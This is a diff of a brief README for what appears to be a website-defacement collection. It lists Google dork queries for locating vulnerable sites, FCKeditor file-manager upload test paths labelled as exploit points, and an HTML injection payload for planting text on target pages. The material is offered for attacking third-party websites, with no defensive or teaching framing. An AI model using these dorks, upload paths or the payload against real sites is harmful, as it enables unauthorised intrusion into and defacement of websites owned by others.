@@ -1,17 +1,23 @@
-# deface-page
-some deface page 
+# Deface-page
+
 
 Dork : 
 
-inurl:"frame=product_detail"
+notice: you google dork that direcotry :)
 
-exploit site :
-
-target.com/jscripts/FCKeditor/editor/filemanager/upload/test.html
+# Fckeditor
 
 inurl:"/showcatrows.php?CategoryID="
 
-"><marquee><h1>Your text</h1></mmarque>
+exploit : "><marquee><h1>Your text</h1></mmarque>
+
+inurl:"frame=product_detail"
+
+exploit :
+
+target.com/jscripts/FCKeditor/editor/filemanager/upload/test.html
+
+target.com/fckeditor/editor/filemanager/browser/default/connectors/test.html
 
 intext:dokumenary.net
 
